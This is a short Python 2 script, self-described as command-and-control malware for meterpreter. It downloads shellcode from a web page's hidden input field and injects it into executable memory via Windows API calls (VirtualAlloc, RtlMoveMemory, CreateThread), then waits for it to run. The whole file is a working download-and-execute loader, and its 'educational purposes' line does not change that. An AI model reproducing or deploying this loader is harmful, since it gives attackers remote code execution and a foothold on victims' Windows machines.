#########################################################################
#        Simple command and control malware with meterpreter v1.0       #
#                                                                       #          
#                        Author: depasonico                             #
#                                                                       #
#                                                                       #
#                       depasonico@gmail.com                            #
#                                                                       #
# Note: This tool is just for educational purposes                      #
#                                                                       #
#########################################################################


import urllib2 #library to connect by HTTP and read HTML
from bs4 import BeautifulSoup #HTML parser
import ctypes #compatibility with C


        
page = urllib2.urlopen("URL") #Change to the URL with the payload
soup = BeautifulSoup(page, 'html.parser') #Using python parser
fooId = soup.find('input',type='hidden') #Find the proper tag
value = fooId['value'].decode('string-escape') #The value attribute
shellcode = bytearray(value) #Converting the payload into bytes

#The magic for injecting the payload in memory
#Improvements can be done here
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
    ctypes.c_int(len(shellcode)),
    ctypes.c_int(0x3000),
    ctypes.c_int(0x40)) #Allocating the memory fof the payload

buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode) #Creating the buffer

ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode))) #Creating the pointer

ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.c_int(ptr),
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.pointer(ctypes.c_int(0))) #Payload execution

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1)) #Wait for the payload to finish 

